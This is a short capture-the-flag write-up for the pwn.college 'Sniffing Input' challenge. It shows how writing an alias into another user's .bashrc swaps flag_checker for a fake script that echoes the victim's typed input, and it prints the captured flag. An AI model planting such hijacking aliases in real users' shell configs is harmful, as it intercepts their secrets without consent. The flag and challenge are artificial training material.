### Sniffing Input 

Your mission is to use your continued write access to Zardus's `.bashrc` to intercept this flag. Remember how you hijacked commands in the [Pondering PATH](https://pwn.college/linux-luminarium/path) module? Can you use that capability to hijack the `flag_checker`?

**flag:** `pwn.college{YJtNDzuqXSN5OODAZvsUFogdJMS.0VNzEzNxwyNwkzNyEzW}`

This is what the flag_checker file contained: 
```bash
#!/opt/pwn.college/bash

echo -n "Type the flag, victim: "
read -r candidate

echo 
if [ "$candidate" = "$(cat /flag)" ]; then
	echo "Correct!"
	exit 0
else
	echo "Incorrect!"
	exit 1
fi
```

What I did: 
- Created my own flag_checker
- Created an alias that runs my flag_checker script which is not the actual flag_checker script
- Run `/challenge/victim` to get the flag

`/home/zardus/.bashrc`:
```bash

### Alias 

alias flag_checker="bash /home/hacker/flag_checker"

```

`/home/hacker/flag_checker`:
```bash
echo -n "Type the flag, victim: "
read -r candidate
echo "\n$candidate"
echo 
if [ "$candidate" = "$(cat /flag)" ]; then
	echo "Correct!"
	# putting echo here would cause an error and won't show the flag as the hacker user doesn't have read permissions to /flag, better to just get the input flag after read
	exit 0
else
	echo "Incorrect!"
	exit 1
fi
```


